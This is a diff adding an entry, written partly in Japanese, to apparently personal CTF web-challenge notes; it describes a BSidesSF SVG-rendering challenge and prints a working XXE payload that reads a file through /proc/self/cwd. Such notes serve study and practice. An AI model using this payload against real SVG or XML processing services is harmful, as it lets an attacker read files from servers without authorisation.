@@ -216,6 +216,26 @@ https://jaiguptanick.github.io/Blog/blog/SharkyCTF_Writeup_web/
     <data>&xxe;</data>
 </root>
 ```
+## XXE (SVG XXE / identify fullpath as /proc/self/cwd/flag.txt)
+https://www.rootnetsec.com/bsidessf-svgmagick/   
+- **entrypoint**   
+`When I render SVGs to PNGs, it's like magic!`というヒントからSVGのXXEだと疑う。   
+- **概要**   
+普通のSVGのXXE。応答が返ってくる。`file://flag.txt`だと500エラーとなってしまうため`proc/self/cwd`を使うらしい。      
+- **Payload**   
+```txt
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE note [
+<!ENTITY file SYSTEM "file:///proc/self/cwd/flag.txt" >
+]>
+<svg height="100" width="1000">
+  <text x="10" y="20">&file;</text>
+</svg>
+```
+## sample
+- **entrypoint**   
+- **概要**   
+- **Payload**   
 ## sample
 - **entrypoint**   
 - **概要**   
